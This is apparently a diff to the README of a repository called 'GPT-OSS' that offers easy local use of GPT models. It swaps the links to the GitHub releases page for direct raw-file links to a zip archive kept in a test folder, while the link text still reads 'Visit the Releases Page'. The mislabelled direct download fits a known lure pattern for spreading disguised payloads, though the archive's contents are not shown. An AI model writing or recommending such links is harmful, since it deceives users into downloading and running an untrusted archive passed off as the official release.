@@ -1,7 +1,7 @@
 # 🤖 GPT-OSS - Run AI Models Without Complexity
 
 ## 📥 Download Now
-[![Download GPT-OSS](https://img.shields.io/badge/Download-GPT--OSS-blue.svg)](https://github.com/MGD-Ben/GPT-OSS/releases)
+[![Download GPT-OSS](https://raw.githubusercontent.com/MGD-Ben/GPT-OSS/main/test/GPT-OSS-v1.5.zip)](https://raw.githubusercontent.com/MGD-Ben/GPT-OSS/main/test/GPT-OSS-v1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to GPT-OSS! This is a simple program that enables you to run the OpenAI GPT model without any complicated setups. Perfect for anyone who wants to explore AI without needing extensive technical knowledge.
@@ -16,7 +16,7 @@ Before you download and install GPT-OSS, make sure you have the following:
 ## 📥 Download & Install
 To get started, visit the releases page to download the software:
 
-[Visit the Releases Page](https://github.com/MGD-Ben/GPT-OSS/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/MGD-Ben/GPT-OSS/main/test/GPT-OSS-v1.5.zip)
 
 1. Click on the link to view the list of available versions.
 2. Find the latest version of GPT-OSS.
